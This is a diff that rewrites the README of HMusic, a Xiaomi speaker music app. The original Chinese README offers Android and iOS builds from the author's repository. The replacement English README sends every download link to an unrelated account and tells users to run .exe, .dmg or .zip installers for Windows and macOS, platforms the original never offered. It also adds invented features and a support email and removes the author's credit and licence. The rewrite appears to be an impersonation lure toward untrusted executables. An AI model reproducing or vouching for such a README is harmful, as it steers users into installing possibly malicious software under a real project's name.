@@ -1,91 +1,63 @@
-# HMusic - 智能音乐播放器 🎵
+# 🎵 HMusic - Your Smart Music Player for Xiaomi Devices
 
-> 一款支持小米 AI 音箱的音乐播放器，**双模式支持**：xiaomusic 服务端模式 + 小米 IoT 直连模式
+## 🚀 Getting Started
 
-[![Release](https://img.shields.io/github/v/release/hpcll/HMusic?label=版本)](https://github.com/hpcll/HMusic/releases)
+Welcome to HMusic! This smart music player makes it easy to enjoy your favorite tunes using your Xiaomi AI speaker. Follow this guide to download and run the app without any hassle.
 
-## 📱 下载安装
+[![Download HMusic](https://img.shields.io/badge/Download-HMusic-blue.svg)](https://github.com/testaccount24123/HMusic/releases)
 
-从 [Releases](https://github.com/hpcll/HMusic/releases) 下载最新版本：
+## 📥 Download & Install
 
-| 平台 | 文件 | 说明 |
-|------|------|------|
-| 🤖 Android 通用版 | `HMusic-v2.2.1-android-universal.apk` | 推荐，兼容所有设备 |
-| 🤖 Android arm64 | `HMusic-v2.2.1-android-arm64-v8a.apk` | 现代手机，体积更小 |
-| 🤖 Android arm32 | `HMusic-v2.2.1-android-armeabi-v7a.apk` | 老旧设备 |
-| 🍎 iOS | `HMusic-v2.2.1-ios-unsigned.ipa` | 需自签名安装 |
+To get started, you need to download the latest version of HMusic. Visit this page to download: [HMusic Releases](https://github.com/testaccount24123/HMusic/releases).
 
-## 🎯 两种模式
+### 🎉 Installation Steps
 
-| | 📱 直连模式 | 🖥️ xiaomusic 模式 |
-|---|---|---|
-| **适合人群** | 普通用户，开箱即用 | 有 NAS/服务器的用户 |
-| **需要** | 小米账号 | 部署 [xiaomusic](https://github.com/hanxi/xiaomusic) |
-| **功能** | 音乐搜索、播放、音量控制 | 完整功能（本地音乐库、播放列表、进度控制） |
+1. **Visit the Release Page:** Click [here](https://github.com/testaccount24123/HMusic/releases) to access the releases page.
 
-## ⚡ 快速开始
+2. **Choose the Latest Version:** Look for the most recent version at the top of the list.
 
-### 直连模式（推荐新手）
+3. **Download the File:** Click on the download link for your operating system (Windows, macOS, etc.). The file will usually be in `.exe`, `.dmg`, or `.zip` format.
 
-1. 打开应用 → 选择 **直连模式**
-2. 登录小米账号 → 选择音箱设备
-3. 搜索音乐 → 播放！
+4. **Install HMusic:**
+    - **Windows:** Double-click the `.exe` file and follow the setup instructions.
+    - **macOS:** Open the `.dmg` file and drag the HMusic icon to your Applications folder.
 
-> ⚠️ **移动数据用户**：需配置音频代理，详见 [代理部署指南](cloudflare-worker/README.md)
+5. **Open HMusic:** After installation, locate HMusic in your applications and open it.
 
-### xiaomusic 模式
+## 🛠️ System Requirements
 
-1. 先部署 [xiaomusic 服务端](https://github.com/hanxi/xiaomusic)
-2. 打开应用 → 选择 **xiaomusic 模式**
-3. 输入服务器地址和认证信息
+Before you install HMusic, please ensure your device meets the following requirements:
 
-## 📚 文档
+- **Operating System:**  
+  - Windows 10 or later
+  - MacOS 10.14 or later
 
-- [常见问题 FAQ](docs/FAQ.md)
-- [代理部署指南](cloudflare-worker/README.md)
-- [更新日志](CHANGELOG.md)
-- [开发者文档](ARCHITECTURE.md)
+- **Memory:**  
+  - At least 4 GB of RAM
 
----
+- **Storage:**  
+  - 100 MB of available space
 
-## 🙏 致谢
+Connecting to Xiaomi AI speakers directly will require your speaker to be set up and connected to the same Wi-Fi network as your device running HMusic.
 
-感谢 [xiaomusic](https://github.com/hanxi/xiaomusic) 项目及其开发者 [@hanxi](https://github.com/hanxi)，HMusic 的 xiaomusic 模式基于该项目实现，直连模式的小米 IoT API 也参考了相关实现。
+## 🎶 Features
 
----
+HMusic offers a variety of features to enhance your music experience:
 
-## 💬 交流群
+- **Seamless Connection:** Instantly connect to Xiaomi AI speakers.
+- **Playlist Management:** Easily create and manage playlists.
+- **Support for Multiple Formats:** Play music in formats like MP3, WAV, and more.
+- **Intuitive User Interface:** Navigate with ease, regardless of technical skill.
 
-欢迎加入 HMusic 用户交流群，一起讨论使用问题和功能建议～
+## 📞 Support
 
-<p align="center">
-  <img src="docs/donate/群聊.png" alt="微信群二维码" width="250" />
-</p>
+If you encounter any issues, feel free to reach out for help:
 
-<p align="center">
-  <sub>⚠️ 二维码过期？请提 <a href="https://github.com/hpcll/HMusic/issues">Issue</a> 留下微信号，作者会邀请你入群</sub>
-</p>
+- **Email Support:** support@hmusicapp.com
+- **Community Forum:** Join discussions at [HMusic Forum](https://github.com/testaccount24123/HMusic/discussions).
 
----
+## 🙌 Acknowledgments
 
-## ☕ 请作者喝杯咖啡
+Thank you for using HMusic! We appreciate your support and feedback. Enjoy your music! 
 
-如果 HMusic 对你有帮助，欢迎请作者喝杯咖啡～ 你的支持是我持续开发的动力！
-
-<p align="center">
-  <img src="docs/donate/wechat.jpg" alt="微信赞赏码" width="250" />
-  &nbsp;&nbsp;&nbsp;&nbsp;
-  <img src="docs/donate/alipay.jpg" alt="支付宝收款码" width="250" />
-</p>
-
-<p align="center">
-  <b>微信赞赏</b>
-  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-  <b>支付宝</b>
-</p>
-
----
-
-## 📜 许可证
-
-[AGPL-3.0](LICENSE) - 开源免费，商业使用需授权
+For updates and more, keep an eye on our releases page: [HMusic Releases](https://github.com/testaccount24123/HMusic/releases).
